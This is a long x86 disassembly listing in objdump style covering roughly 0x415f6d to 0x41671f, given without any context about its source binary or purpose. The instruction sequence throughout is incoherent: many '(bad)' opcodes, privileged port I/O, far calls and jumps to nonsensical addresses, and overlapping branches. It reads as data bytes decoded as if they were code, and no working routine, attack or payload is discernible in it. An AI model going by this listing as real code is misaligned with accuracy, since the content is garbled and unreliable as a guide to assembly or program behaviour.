  415f6d:	sbb    BYTE PTR [edi],0xf2
  415f70:	call   0xdc36:0xf6e56918
  415f77:	pusha  
  415f78:	not    bl
  415f7a:	jle    0x415f5f
  415f7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f7d:	loopne 0x415f84
  415f7f:	stc    
  415f80:	hlt    
  415f81:	(bad)  
  415f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f83:	or     DWORD PTR [edx],edx
  415f85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f86:	xchg   ebp,eax
  415f87:	retf   
  415f88:	fadd   st(2),st
  415f8a:	lahf   
  415f8b:	or     al,0xe1
  415f8d:	mov    ebx,0xfc347ae
  415f92:	ds push es
  415f94:	pop    es
  415f95:	mov    WORD PTR [ebx],ss
  415f97:	daa    
  415f98:	jecxz  0x415fe2
  415f9a:	or     al,0xea
  415f9c:	xchg   esp,eax
  415f9d:	push   ecx
  415f9e:	inc    esp
  415f9f:	dec    ebp
  415fa0:	pusha  
  415fa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fa2:	in     eax,dx
  415fa3:	out    dx,eax
  415fa4:	lock enter 0x9b1e,0x71
  415fa9:	pop    ss
  415faa:	pop    ss
  415fab:	add    DWORD PTR [esi],edi
  415fad:	adc    ecx,eax
  415faf:	cvtdq2ps xmm4,XMMWORD PTR [edx-0x1b]
  415fb3:	stc    
  415fb4:	sbb    esp,edx
  415fb6:	out    0x4a,eax
  415fb8:	icebp  
  415fb9:	jnp    0x416021
  415fbb:	mov    edi,0x299211be
  415fc0:	lock mov bl,0x17
  415fc3:	frstor [esi]
  415fc5:	popa   
  415fc6:	sbb    ebx,ebx
  415fc8:	xchg   ebp,eax
  415fc9:	mov    dl,dl
  415fcb:	pop    ecx
  415fcc:	xor    BYTE PTR [ebx+0x35a8d2dc],bl
  415fd2:	mov    eax,0x434fcccd
  415fd7:	jb     0x415fdc
  415fd9:	jne    0x416015
  415fdb:	pop    ecx
  415fdc:	outs   dx,BYTE PTR ds:[esi]
  415fdd:	mov    ebp,0x7c6f036f
  415fe2:	das    
  415fe3:	adc    al,0xb2
  415fe5:	leave  
  415fe6:	in     al,0x19
  415fe8:	fstp   st(5)
  415fea:	xchg   edx,eax
  415feb:	out    0x9d,al
  415fed:	icebp  
  415fee:	jae    0x415fa4
  415ff0:	xor    BYTE PTR [ecx-0x776b937a],dl
  415ff6:	lds    ebp,FWORD PTR [edi*1-0x530c7dfd]
  415ffd:	pop    esi
  415ffe:	lock and DWORD PTR [ecx+0x62],esi
  416002:	push   edx
  416003:	push   0x4
  416005:	stos   BYTE PTR es:[edi],al
  416006:	sub    ecx,DWORD PTR [esi-0x3f]
  416009:	mov    DWORD PTR [ecx+0x3a78c780],ecx
  41600f:	pop    ecx
  416010:	cwde   
  416011:	pusha  
  416012:	xor    BYTE PTR [esp+esi*1-0xd],ch
  416016:	rcr    DWORD PTR [ebx+edi*2-0x2],0xca
  41601b:	adc    eax,0x46ccccac
  416020:	cmc    
  416021:	pusha  
  416022:	adc    ebx,esp
  416024:	jb     0x41601f
  416026:	mov    dl,BYTE PTR [edx-0x4c]
  416029:	pop    esi
  41602a:	mov    ebp,0xe2f1b893
  41602f:	fucomp st(7)
  416031:	jne    0x416047
  416033:	outs   dx,BYTE PTR ds:[esi]
  416034:	push   0x4184706b
  416039:	test   eax,0x48a467fb
  41603e:	scas   al,BYTE PTR es:[edi]
  41603f:	inc    ebx
  416040:	sbb    al,0xe8
  416042:	inc    eax
  416043:	adc    BYTE PTR [ebx-0x3b],dh
  416046:	dec    esi
  416047:	cld    
  416048:	xor    DWORD PTR [ecx+eax*8+0x77217cf2],ebp
  41604f:	fisttp WORD PTR [ecx-0x2b]
  416052:	mov    bh,0x5f
  416054:	popa   
  416055:	aad    0x8c
  416057:	push   edi
  416058:	shl    DWORD PTR [ecx-0x2fbf642a],cl
  41605e:	jns    0x41605f
  416060:	retf   
  416061:	outs   dx,BYTE PTR ds:[esi]
  416062:	ror    DWORD PTR [edx],1
  416064:	ret    0x9dcd
  416067:	ins    BYTE PTR es:[edi],dx
  416068:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416069:	xor    ecx,eax
  41606b:	inc    ebp
  41606c:	pushf  
  41606d:	pop    edi
  41606e:	in     al,dx
  41606f:	(bad)  
  416070:	mov    eax,esp
  416072:	inc    eax
  416073:	arpl   WORD PTR [ecx+0x44],sp
  416076:	xor    eax,0xf8904002
  41607b:	jecxz  0x41604e
  41607d:	push   edx
  41607e:	sub    ah,BYTE PTR [edx]
  416080:	mov    ebp,0x4ac57a0f
  416085:	sar    BYTE PTR [ecx],1
  416087:	xor    cl,BYTE PTR [eax-0x7eac6482]
  41608d:	(bad)  
  41608e:	mov    ?,WORD PTR [ebx]
  416090:	in     al,dx
  416091:	cmp    esi,DWORD PTR [ebp-0x35]
  416094:	push   ds
  416095:	hlt    
  416096:	cmp    BYTE PTR [ecx],al
  416098:	call   0x447:0x1b21cac6
  41609f:	gs push edi
  4160a1:	push   es
  4160a2:	jecxz  0x41610b
  4160a4:	adc    DWORD PTR [ebx],ebp
  4160a6:	fs fdivr st,st(5)
  4160a9:	mov    WORD PTR [esi-0x2365fa38],ds
  4160af:	jns    0x41611c
  4160b1:	push   es
  4160b2:	nop
  4160b3:	cld    
  4160b4:	aas    
  4160b5:	in     eax,dx
  4160b6:	pop    esi
  4160b7:	(bad)  
  4160b8:	div    BYTE PTR [esi+0x36]
  4160bb:	rcr    al,cl
  4160bd:	sub    eax,0x2686a870
  4160c2:	sub    DWORD PTR ds:0x63314eaa,ebx
  4160c8:	mov    eax,ds:0xdc865f4f
  4160cd:	inc    ebp
  4160ce:	les    ebp,FWORD PTR ds:0xab5502b2
  4160d4:	or     eax,0xfbf0c076
  4160d9:	cmp    DWORD PTR [ebx+0x15d09f3f],esp
  4160df:	inc    esi
  4160e0:	jbe    0x41606c
  4160e2:	jg     0x416064
  4160e4:	cld    
  4160e5:	ins    DWORD PTR es:[edi],dx
  4160e6:	ror    BYTE PTR ds:0xab400211,1
  4160ec:	xor    al,BYTE PTR [eax]
  4160ee:	out    dx,eax
  4160ef:	push   eax
  4160f0:	out    dx,eax
  4160f1:	jmp    0x416109
  4160f3:	jmp    0x416102
  4160f5:	out    0x40,al
  4160f7:	dec    esp
  4160f8:	ja     0x41615a
  4160fa:	ins    BYTE PTR es:[edi],dx
  4160fb:	mov    bh,0x63
  4160fd:	xor    eax,0x8006d4e6
  416102:	jnp    0x416176
  416104:	sub    edx,DWORD PTR [ebx]
  416106:	dec    edi
  416107:	jo     0x4160c4
  416109:	cmp    al,0x19
  41610b:	jnp    0x4160d5
  41610d:	aad    0xed
  41610f:	loop   0x416119
  416111:	sti    
  416112:	js     0x416170
  416114:	xchg   BYTE PTR [esi],al
  416116:	adc    esi,DWORD PTR [ebx-0x2e]
  416119:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41611a:	pop    edi
  41611b:	add    al,0xcd
  41611d:	test   eax,edi
  41611f:	mov    al,ds:0x8fc19e6d
  416124:	sub    eax,0x71aa8a55
  416129:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41612a:	xchg   ebp,eax
  41612b:	lahf   
  41612c:	(bad)  
  41612d:	inc    ecx
  41612e:	mov    al,ds:0x8777c6ba
  416133:	pop    es
  416134:	xor    DWORD PTR [ebx],esp
  416136:	jb     0x416136
  416138:	out    dx,al
  416139:	push   es
  41613a:	retf   
  41613b:	adc    DWORD PTR [ecx-0x4e],ecx
  41613e:	repnz sbb eax,0xb9d1e5d
  416144:	je     0x4160e1
  416146:	add    BYTE PTR [ecx-0x253cb864],al
  41614c:	scas   al,BYTE PTR es:[edi]
  41614d:	push   edx
  41614e:	iret   
  41614f:	leave  
  416150:	add    al,0xc3
  416152:	mov    al,0xd4
  416154:	jl     0x4161cd
  416156:	ins    DWORD PTR es:[edi],dx
  416157:	cli    
  416158:	inc    esi
  416159:	aaa    
  41615a:	xor    eax,0xc436d8bd
  41615f:	jo     0x41619e
  416161:	jne    0x4160f8
  416163:	inc    ecx
  416164:	aad    0xae
  416166:	test   esp,ebp
  416168:	xor    BYTE PTR [ebx+0x6b3fe1b7],ch
  41616e:	mov    DWORD PTR [ebp+0x31c2e8cd],edi
  416174:	dec    esp
  416175:	in     eax,0x94
  416177:	imul   esi,DWORD PTR [edi+0x43],0xeea7438a
  41617e:	pusha  
  41617f:	shr    DWORD PTR [ebp+0x1a],1
  416182:	dec    edx
  416183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416184:	cwde   
  416185:	sub    al,0xf0
  416187:	(bad)  
  416188:	pop    edx
  416189:	(bad)  
  41618b:	and    DWORD PTR [eax-0x54c70ae6],0x410794b
  416195:	fmulp  st(5),st
  416197:	sub    DWORD PTR [ebp+esi*1-0x12],esp
  41619b:	cmp    cl,0xf6
  41619e:	push   ebp
  41619f:	mov    ch,0x76
  4161a1:	sbb    al,0xdf
  4161a3:	mov    ds:0x9294dcff,al
  4161a8:	sbb    dh,ch
  4161aa:	outs   dx,BYTE PTR ds:[esi]
  4161ab:	imul   ebx,ebp,0xffffffe8
  4161ae:	jno    0x4161ad
  4161b0:	gs (bad) 
  4161b2:	shl    bh,1
  4161b4:	adc    al,0xbe
  4161b6:	mov    ecx,0xfeebd7cf
  4161bb:	scas   eax,DWORD PTR es:[edi]
  4161bc:	jo     0x416187
  4161be:	retf   0xa25a
  4161c1:	push   edx
  4161c2:	fistp  DWORD PTR [eax+0x2791746a]
  4161c8:	fcmovu st,st(0)
  4161ca:	sbb    ebx,ecx
  4161cc:	or     ebp,DWORD PTR [edx+0x3c]
  4161cf:	add    al,0x6f
  4161d1:	sbb    DWORD PTR [eax],esp
  4161d3:	bound  esi,QWORD PTR [eax-0x51]
  4161d6:	or     DWORD PTR [ecx-0xc],0x6d
  4161da:	hlt    
  4161db:	or     BYTE PTR [eax-0x6c],dl
  4161de:	jl     0x41622f
  4161e0:	clc    
  4161e1:	mov    BYTE PTR [ecx+eiz*4+0xe],0x64
  4161e6:	aaa    
  4161e7:	mov    edx,DWORD PTR [ecx+ebp*1-0x59]
  4161eb:	jp     0x416205
  4161ed:	ffreep st(5)
  4161ef:	imul   ecx,ebx,0xfffffff4
  4161f2:	xlat   BYTE PTR ds:[ebx]
  4161f3:	xchg   edi,eax
  4161f4:	xor    al,0xb0
  4161f6:	sbb    al,0x62
  4161f8:	mov    edi,0x7f35df11
  4161fd:	jbe    0x416257
  4161ff:	rcr    edx,cl
  416201:	nop
  416202:	hlt    
  416203:	std    
  416204:	pop    ebp
  416205:	jg     0x41620d
  416207:	mov    cl,0xe5
  416209:	mov    eax,0xc396cf19
  41620e:	mov    ds:0xfe48b0a5,al
  416213:	mov    esp,0x414afd76
  416218:	sub    cl,BYTE PTR [esi-0x2c]
  41621b:	pop    ebp
  41621c:	test   BYTE PTR [ecx+0x5798f5b8],ah
  416222:	aas    
  416223:	fld    QWORD PTR [ebp-0x26]
  416226:	mov    ecx,0x4b21274c
  41622b:	out    0x2,eax
  41622d:	add    esi,ebp
  41622f:	xchg   ebp,eax
  416230:	pushf  
  416231:	mov    ebx,0x90aad35
  416236:	adc    DWORD PTR [ecx],0xffffff9b
  416239:	ins    DWORD PTR es:[edi],dx
  41623a:	jle    0x41620a
  41623c:	je     0x4162bd
  41623e:	add    DWORD PTR [bp+0x7894],ecx
  416243:	sbb    ebp,ebx
  416245:	dec    ebp
  416246:	rcl    BYTE PTR [edx],0x0
  416249:	sbb    ecx,0xd
  41624c:	dec    edx
  41624d:	fild   QWORD PTR ds:0x45d39bdf
  416253:	(bad)  
  416254:	adc    al,0x9a
  416256:	shl    BYTE PTR [ebp+ecx*4-0x360bbae3],1
  41625d:	or     al,0x5c
  41625f:	inc    esi
  416260:	add    BYTE PTR [edi-0x59],bl
  416263:	add    DWORD PTR [ebp+0x1bdfb32f],ebp
  416269:	fild   DWORD PTR [edx]
  41626b:	mov    dh,0xcc
  41626d:	(bad)  
  41626e:	ds pop ebx
  416270:	sub    BYTE PTR ds:0x4f13acb4,ch
  416276:	sahf   
  416277:	dec    ebp
  416278:	push   ebp
  416279:	jg     0x416211
  41627b:	inc    ecx
  41627c:	rol    DWORD PTR [edi],1
  41627e:	fsubr  st,st(0)
  416280:	xchg   bh,ch
  416282:	xor    al,0x8
  416284:	je     0x4162f4
  416286:	jmp    0x41622a
  416288:	pop    ebp
  416289:	pop    DWORD PTR [esi+eiz*2-0x349b49a9]
  416290:	sbb    ecx,DWORD PTR [edx-0x4f]
  416293:	mov    eax,ds:0x12e69f67
  416298:	ret    
  416299:	test   eax,0xee75e028
  41629e:	mov    bh,0xfc
  4162a0:	push   edx
  4162a1:	cs jmp 0xc1547cb7
  4162a7:	(bad)  
  4162a9:	inc    esp
  4162aa:	scas   al,BYTE PTR es:[edi]
  4162ab:	inc    edx
  4162ac:	cmp    eax,0x4e9254ab
  4162b1:	jb     0x416243
  4162b3:	je     0x41632a
  4162b5:	mov    ds:0x8340e9d1,eax
  4162ba:	cmp    ebp,ebp
  4162bc:	xor    cl,BYTE PTR [edx+ebp*2-0x59]
  4162c0:	shl    DWORD PTR [eax+0x410ff911],1
  4162c6:	mov    gs,eax
  4162c8:	pop    eax
  4162c9:	and    al,0xb5
  4162cb:	pop    ds
  4162cc:	imul   DWORD PTR [ebp-0x5c0008f8]
  4162d2:	(bad)  
  4162d4:	fisub  DWORD PTR [edi+0x165fc82f]
  4162da:	dec    ebp
  4162db:	loope  0x41633f
  4162dd:	xchg   bl,dl
  4162df:	int    0x65
  4162e1:	jg     0x4162f6
  4162e3:	dec    esp
  4162e4:	xor    bh,BYTE PTR [edx-0x6ab3b409]
  4162ea:	repz mov ebx,0x8fb1eb94
  4162f0:	stos   DWORD PTR es:[edi],eax
  4162f1:	add    DWORD PTR [edi-0x2f],0xf6906f2d
  4162f8:	add    DWORD PTR [edx-0x1d9efcdf],ebx
  4162fe:	aas    
  4162ff:	stc    
  416300:	nop
  416301:	pop    edi
  416302:	aam    0x60
  416304:	cmp    DWORD PTR [eax],esi
  416306:	add    al,0x57
  416308:	mov    edx,0x7549d66d
  41630d:	clc    
  41630e:	ret    
  41630f:	ds stos DWORD PTR es:[edi],eax
  416311:	jo     0x41633f
  416313:	shl    BYTE PTR [edx-0x69],1
  416316:	push   ecx
  416317:	outs   dx,BYTE PTR ds:[esi]
  416318:	cld    
  416319:	sbb    eax,DWORD PTR [edx]
  41631b:	cli    
  41631c:	add    al,0x8f
  41631e:	dec    eax
  41631f:	ja     0x416399
  416321:	xchg   ebp,eax
  416322:	ss inc ecx
  416324:	das    
  416325:	retf   0x23ac
  416328:	dec    ecx
  416329:	sti    
  41632a:	add    eax,0xee4009e9
  41632f:	push   ds
  416330:	add    ecx,DWORD PTR [eax+0x7d]
  416333:	test   al,0xc0
  416335:	sub    ecx,edx
  416337:	repz dec edx
  416339:	ja     0x416384
  41633b:	mov    edx,0xcbc4e657
  416340:	or     DWORD PTR [edi],edx
  416342:	jae    0x41637a
  416344:	adc    ah,BYTE PTR [ebx-0x62]
  416347:	call   0x9176156d
  41634c:	ins    BYTE PTR es:[edi],dx
  41634d:	popa   
  41634e:	(bad)  
  41634f:	hlt    
  416350:	jmp    0x616:0x381473ac
  416357:	push   ebp
  416358:	ficom  WORD PTR [eax+0x77]
  41635b:	xor    eax,0xad0574ea
  416360:	cmp    al,BYTE PTR [ebx]
  416362:	mov    ch,0x5c
  416364:	loope  0x41636c
  416366:	mov    dh,0xbd
  416368:	nop
  416369:	sub    eax,0xbda814d1
  41636e:	jp     0x41630c
  416370:	push   ebx
  416371:	mov    esi,0x9ad5fd8
  416376:	xchg   esi,eax
  416377:	xor    ah,dl
  416379:	sbb    edi,DWORD PTR [ebx+edi*4+0x6b]
  41637d:	jo     0x4163de
  41637f:	mov    bh,0xab
  416381:	fild   WORD PTR [edi+0x79]
  416384:	shl    BYTE PTR [edx],0x5a
  416387:	mov    bl,0x7c
  416389:	in     eax,0xfc
  41638b:	es push cs
  41638d:	add    BYTE PTR [esi],bh
  41638f:	fisub  WORD PTR [esi]
  416391:	sbb    DWORD PTR [ecx-0x15],esp
  416394:	xor    al,ah
  416396:	cmp    eax,0x7e9d5e02
  41639c:	and    eax,0x25a32dfe
  4163a1:	jmp    0x5ea9:0xd1fce3c
  4163a8:	stc    
  4163a9:	mov    bh,0x1b
  4163ab:	scas   eax,DWORD PTR es:[edi]
  4163ac:	or     bl,ch
  4163ae:	xor    al,0xfe
  4163b0:	xor    BYTE PTR [esi-0x75],bh
  4163b3:	xchg   ebx,eax
  4163b5:	mov    DWORD PTR [edi+0x41],0x5b70712a
  4163bc:	loop   0x416414
  4163be:	add    ah,cl
  4163c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163c1:	inc    ebx
  4163c2:	add    DWORD PTR [esi],edi
  4163c4:	or     al,BYTE PTR [edx+0x3453ec33]
  4163ca:	cmp    al,0xee
  4163cc:	call   0x979b:0x338b0b24
  4163d3:	outs   dx,BYTE PTR ds:[esi]
  4163d4:	xor    esi,0xc0669d10
  4163da:	sub    dl,BYTE PTR gs:[ecx]
  4163dd:	lods   eax,DWORD PTR ds:[esi]
  4163de:	push   ss
  4163df:	add    ebp,edx
  4163e1:	aas    
  4163e2:	or     BYTE PTR [ecx],ah
  4163e4:	xchg   edx,eax
  4163e5:	or     esi,DWORD PTR [ebx+edi*4+0x4c]
  4163e9:	push   ebp
  4163ea:	dec    edi
  4163eb:	or     al,0x13
  4163ed:	jge    0x416399
  4163ef:	push   cs
  4163f0:	add    eax,0xafd347d1
  4163f5:	jae    0x41638c
  4163f7:	in     eax,dx
  4163f8:	inc    ebx
  4163f9:	loopne 0x41642f
  4163fb:	push   edi
  4163fc:	in     al,0xbd
  4163fe:	loopne 0x416475
  416400:	and    al,0x16
  416402:	lahf   
  416403:	dec    ebx
  416404:	pop    esi
  416405:	out    dx,eax
  416406:	jl     0x4163c7
  416408:	pop    ebp
  416409:	pop    esp
  41640a:	(bad)  
  41640b:	cli    
  41640c:	push   edx
  41640d:	xchg   edi,eax
  41640e:	or     esp,esp
  416410:	xchg   esp,eax
  416411:	scas   al,BYTE PTR es:[edi]
  416412:	ret    0xa156
  416415:	and    BYTE PTR [esi+0x4b],0xc6
  416419:	jbe    0x416450
  41641b:	push   es
  41641c:	push   ecx
  41641d:	xchg   ebp,eax
  41641e:	dec    ebp
  41641f:	mov    ah,0xff
  416421:	mov    cl,0x3e
  416423:	dec    esp
  416424:	sbb    ch,BYTE PTR [edi]
  416426:	jmp    0x416453
  416428:	inc    ebx
  416429:	inc    esi
  41642a:	jmp    0x41648e
  41642c:	not    BYTE PTR [ecx]
  41642e:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  416430:	push   esi
  416431:	iret   
  416432:	lods   al,BYTE PTR ds:[esi]
  416433:	jp     0x41648d
  416435:	ss das 
  416437:	in     eax,dx
  416438:	sub    al,0x9
  41643a:	popf   
  41643b:	adc    ch,BYTE PTR [eax-0x5105bdc8]
  416441:	pop    esi
  416442:	pop    es
  416443:	clc    
  416444:	inc    ebp
  416445:	push   edx
  416446:	lods   eax,DWORD PTR ds:[esi]
  416447:	ret    0x6140
  41644a:	mov    ds:0xe8db0bc1,eax
  41644f:	push   edx
  416450:	out    0x89,al
  416452:	xor    eax,0x3b92e795
  416457:	es nop
  416459:	cld    
  41645a:	mov    ecx,0xf7824aab
  41645f:	mov    eax,ds:0xf8f5401d
  416464:	fnstenv [ebx+eiz*2+0x33]
  416468:	jo     0x4164c5
  41646a:	out    0x70,al
  41646c:	inc    esi
  41646d:	faddp  st(4),st
  41646f:	ins    DWORD PTR es:[edi],dx
  416470:	mov    dl,0xb8
  416472:	repz cmp ebp,esp
  416475:	call   0x1fd69057
  41647a:	test   al,0x7d
  41647c:	or     DWORD PTR [esp+edx*8-0x2be83957],eax
  416483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416484:	(bad)  
  416485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416486:	fldcw  WORD PTR [ebx+0x5bb036eb]
  41648c:	test   cl,dh
  41648e:	lahf   
  41648f:	(bad)  
  416490:	jge    0x416509
  416492:	sahf   
  416493:	mov    al,ds:0x740d3143
  416498:	jp     0x41643f
  41649a:	retf   0x14e8
  41649d:	or     eax,0x7a287160
  4164a2:	mov    ebp,esi
  4164a4:	jmp    0xddc7491a
  4164a9:	mov    ds:0x8c13973d,eax
  4164ae:	jl     0x41646f
  4164b0:	fucomip st,st(6)
  4164b2:	push   ebp
  4164b3:	mov    ds:0x1d2c28e3,eax
  4164b8:	inc    eax
  4164b9:	test   al,0xed
  4164bb:	aaa    
  4164bc:	jl     0x4164be
  4164be:	test   al,0x70
  4164c0:	bound  ebx,QWORD PTR [ecx-0x7b05bee5]
  4164c6:	dec    ebx
  4164c7:	mov    ds:0x725f1421,al
  4164cc:	sbb    al,dl
  4164ce:	adc    edx,DWORD PTR ss:[ebx+eax*1-0x1a]
  4164d3:	jecxz  0x416494
  4164d5:	push   es
  4164d6:	pop    es
  4164d7:	bound  edi,QWORD PTR [eax+0x64dd8919]
  4164dd:	ins    BYTE PTR es:[edi],dx
  4164de:	out    0xf6,al
  4164e0:	push   0xffffff89
  4164e2:	sbb    BYTE PTR [edx],dl
  4164e4:	jmp    0x25f0:0x51437bb6
  4164eb:	pop    ss
  4164ec:	pop    ebp
  4164ed:	pop    ebx
  4164ee:	pop    ecx
  4164ef:	fsub   DWORD PTR [esi]
  4164f1:	popa   
  4164f2:	sbb    bl,BYTE PTR [esi+0x5034a49]
  4164f8:	cmp    eax,DWORD PTR ds:[ecx]
  4164fb:	jne    0x4164ff
  4164fd:	xchg   esp,eax
  4164fe:	mov    ebx,0x2c1bc6d3
  416503:	jns    0x41654a
  416505:	ret    0x5ae1
  416508:	(bad)  
  416509:	and    DWORD PTR [ebx+eax*2+0x3b],ecx
  41650d:	icebp  
  41650e:	pop    eax
  41650f:	out    0x11,al
  416511:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416512:	(bad)
  416515:	xchg   ebx,eax
  416516:	xor    eax,0x86c42d7b
  41651b:	xchg   ecx,eax
  41651c:	aas    
  41651d:	add    eax,0xb9e051eb
  416522:	stos   DWORD PTR es:[edi],eax
  416523:	cs pop ss
  416525:	(bad)  
  416526:	ss into 
  416528:	push   DWORD PTR [edx+0x5b]
  41652b:	repz xlat BYTE PTR gs:[ebx]
  41652e:	jl     0x4164cf
  416530:	xchg   ecx,eax
  416531:	lods   al,BYTE PTR ds:[esi]
  416532:	js     0x41654d
  416534:	adc    BYTE PTR [edx+0x7ecb9c6c],bh
  41653a:	cmp    eax,0x4cb0092d
  41653f:	in     al,0x39
  416541:	adc    ebp,eax
  416543:	xchg   ebp,eax
  416544:	(bad)
  416548:	cmp    ebx,DWORD PTR [edx+0xbf30a39]
  41654e:	push   0x7f
  416550:	lds    esp,FWORD PTR [edx+0x47]
  416553:	or     al,0xa1
  416555:	xor    DWORD PTR [ebx],ecx
  416557:	rcl    BYTE PTR [esi-0x1712818e],1
  41655d:	cmp    al,0xde
  41655f:	mov    ch,0xa4
  416561:	aaa    
  416562:	pop    ds
  416563:	sbb    bl,bh
  416565:	jae    0x416571
  416567:	jmp    0x77b5e0db
  41656c:	stos   DWORD PTR es:[edi],eax
  41656d:	in     al,0x74
  41656f:	ss cwde 
  416571:	cdq    
  416572:	mov    ah,BYTE PTR [esi-0x42b0f95f]
  416578:	(bad)  
  416579:	dec    ebp
  41657a:	dec    ebx
  41657b:	mov    ah,0x70
  41657d:	and    DWORD PTR [ecx+0x72],esi
  416580:	cmp    DWORD PTR [eax+0x324fa4da],0x74f88a8b
  41658a:	mov    al,0xd6
  41658c:	xor    BYTE PTR [edi-0x7cb5d74b],dl
  416592:	mov    ebx,0x97ca7241
  416597:	sbb    BYTE PTR [esi],ah
  416599:	cwde   
  41659a:	adc    al,0x5a
  41659c:	hlt    
  41659d:	retf   
  41659e:	mov    ecx,0x7624dbd6
  4165a3:	sub    al,0xaa
  4165a5:	gs retf 0x9283
  4165a9:	dec    ebx
  4165aa:	pop    ebx
  4165ab:	aam    0xa0
  4165ad:	mov    DWORD PTR ss:[eax+0x73820d91],eax
  4165b4:	js     0x416561
  4165b6:	push   ds
  4165b7:	sbb    ch,BYTE PTR [edx+0x2f171c8b]
  4165bd:	mov    ebx,esi
  4165bf:	xor    esp,DWORD PTR [edi-0x2b]
  4165c2:	int    0x12
  4165c4:	lods   eax,DWORD PTR ds:[esi]
  4165c5:	mov    eax,ds:0x58222397
  4165ca:	sub    DWORD PTR [esi-0x65c98795],edx
  4165d0:	les    esp,FWORD PTR [eax+0x75]
  4165d3:	adc    BYTE PTR [edi+ebp*4],cl
  4165d6:	imul   ecx,DWORD PTR [ebx-0x2c],0xffffff9f
  4165da:	pop    esi
  4165db:	adc    eax,0x7cfc7f80
  4165e0:	xor    eax,0xa67ba99f
  4165e5:	cmp    dl,BYTE PTR ds:[edx-0x2bb963f2]
  4165ec:	cmp    eax,0x36926b94
  4165f1:	inc    esp
  4165f2:	aas    
  4165f3:	push   ss
  4165f4:	mov    ebx,0x3b028039
  4165f9:	popa   
  4165fa:	sub    edi,DWORD PTR [edx]
  4165fc:	mov    bh,0xc5
  4165fe:	pop    eax
  4165ff:	ins    DWORD PTR es:[edi],dx
  416600:	call   0x321c7b9d
  416605:	add    DWORD PTR [edx+0x31],0xffffff8b
  416609:	outs   dx,BYTE PTR ds:[esi]
  41660a:	pushf  
  41660b:	iret   
  41660c:	out    0x25,al
  41660e:	xor    eax,0xaa67d015
  416613:	jns    0x41660d
  416615:	imul   esp,DWORD PTR [ebp+0x46fd4b5],0x2b
  41661c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41661d:	mov    ebx,0x4b84c65c
  416622:	dec    esi
  416623:	and    BYTE PTR [edi-0x6b8b9e24],ah
  416629:	adc    eax,ecx
  41662b:	pop    eax
  41662c:	or     DWORD PTR [ebx],esi
  41662e:	data16 mov al,0xbe
  416631:	push   0x5c
  416633:	imul   esi,DWORD PTR [ebp-0x2e],0xffffffc5
  416637:	or     eax,0x3c625c75
  41663c:	dec    ebp
  41663d:	popa   
  41663e:	xchg   ebx,eax
  41663f:	xchg   edi,eax
  416640:	inc    edi
  416641:	dec    esi
  416642:	iret   
  416643:	and    ebp,DWORD PTR [ecx+0x445b0fcf]
  416649:	(bad)  
  41664a:	fdiv   DWORD PTR [ecx+0x6878cbec]
  416650:	arpl   WORD PTR [edx],sp
  416652:	popf   
  416653:	nop
  416654:	(bad)  
  416655:	imul   ecx,DWORD PTR [eax+0x24],0xff73a1a4
  41665c:	test   DWORD PTR [ecx],eax
  41665e:	fdiv   st(4),st
  416660:	inc    ecx
  416661:	sbb    edx,DWORD PTR [ebx+0x40]
  416664:	add    bh,BYTE PTR [eax]
  416666:	imul   ebp,edi,0xffffffd7
  416669:	xor    DWORD PTR [ebx+0x22],0xfffffffe
  41666d:	pop    ss
  41666e:	inc    ebx
  41666f:	out    0xb9,eax
  416671:	or     al,0x30
  416673:	dec    esp
  416674:	pusha  
  416675:	mov    ah,0xd7
  416677:	push   0x5254de3e
  41667c:	sar    DWORD PTR [ecx+0x2caad9f],1
  416682:	sbb    eax,0xc6dada79
  416687:	or     BYTE PTR [ebp-0x7b],dh
  41668a:	mov    eax,0xd0742767
  41668f:	shl    BYTE PTR [esi-0x1a],0xa9
  416693:	push   ss
  416694:	jb     0x416676
  416696:	jo     0x416683
  416698:	xchg   edx,eax
  416699:	ins    BYTE PTR es:[edi],dx
  41669a:	add    BYTE PTR [ebx+0x41086d2c],dh
  4166a0:	inc    esp
  4166a1:	add    bh,0xb3
  4166a4:	pop    ecx
  4166a5:	mov    al,BYTE PTR [ebp-0x68]
  4166a8:	push   esp
  4166a9:	jmp    0x41663a
  4166ab:	ja     0x416664
  4166ad:	je     0x416715
  4166af:	push   esp
  4166b0:	mov    al,ds:0xd2be0aa4
  4166b5:	cmc    
  4166b6:	sbb    eax,0x4875105c
  4166bb:	(bad)  
  4166bc:	(bad)  
  4166bd:	js     0x416656
  4166bf:	mov    edi,DWORD PTR [edi+esi*4]
  4166c2:	icebp  
  4166c3:	push   edi
  4166c4:	popa   
  4166c5:	vandps ymm6,ymm4,YMMWORD PTR [edi+0xd2774aa]
  4166cd:	dec    ecx
  4166ce:	test   al,0x18
  4166d0:	rep ins DWORD PTR es:[edi],dx
  4166d2:	mov    ecx,0x9a8749ac
  4166d7:	add    al,0x35
  4166d9:	jl     0x41670d
  4166db:	xor    eax,0xcafa9891
  4166e0:	shl    DWORD PTR [edx],cl
  4166e2:	fld    DWORD PTR [edi-0x5f]
  4166e5:	jbe    0x41671b
  4166e7:	or     eax,0x620495d9
  4166ec:	or     DWORD PTR [edi],ebx
  4166ee:	test   al,0x85
  4166f0:	dec    esp
  4166f1:	sbb    DWORD PTR [ecx-0x6d],ebp
  4166f4:	dec    eax
  4166f5:	in     al,0xab
  4166f7:	lock dec esi
  4166f9:	inc    esp
  4166fa:	sub    al,0xfc
  4166fc:	call   0x5d96089d
  416701:	cmp    al,0x1d
  416703:	inc    edi
  416704:	cdq    
  416705:	inc    ch
  416707:	out    dx,eax
  416708:	inc    ecx
  416709:	dec    esi
  41670a:	out    0x9b,al
  41670c:	jne    0x416725
  41670e:	mov    ecx,eax
  416710:	jl     0x416757
  416712:	imul   esp,DWORD PTR [eax+0x29],0x52da1a7c
  416719:	or     bh,BYTE PTR [eax]
  41671b:	mov    bh,0x6c
  41671d:	repz push edx
  41671f:	(bad)  
